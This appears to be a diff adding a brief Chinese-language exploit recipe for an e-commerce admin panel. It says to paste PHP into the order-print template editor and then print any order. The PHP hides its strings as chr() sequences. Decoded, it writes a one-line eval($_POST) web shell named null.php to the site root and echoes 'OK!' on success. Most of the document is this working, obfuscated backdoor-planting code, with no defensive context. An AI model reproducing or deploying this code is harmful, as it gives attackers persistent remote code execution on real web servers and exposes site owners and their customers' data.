@@ -1,0 +1,18 @@
+后台-订单管理-订单打印-选择源代码编辑-保存
+
+利用代码 
+
+<?php
+$filen=chr(46).chr(46).chr(47).chr(110).chr(117).chr(108).chr(108).chr(46).chr(112).chr(104).chr(112);
+$filec=chr(60).chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(117).chr(115).chr(98).chr(93).chr(41).chr(59).chr(63).chr(62);
+$a=chr(119);
+$fp=@fopen($filen,$a);
+$msg=@fwrite($fp,$filec);
+if($msg) echo chr(79).chr(75).chr(33);
+@fclose($fp);
+?>
+
+
+返回订单列表，随意选择一个订单打印，返回OK，生成一句话成功！
+
+下面有OK! 说明已经成功了。再根目录下面生成了一个null.php的一句话
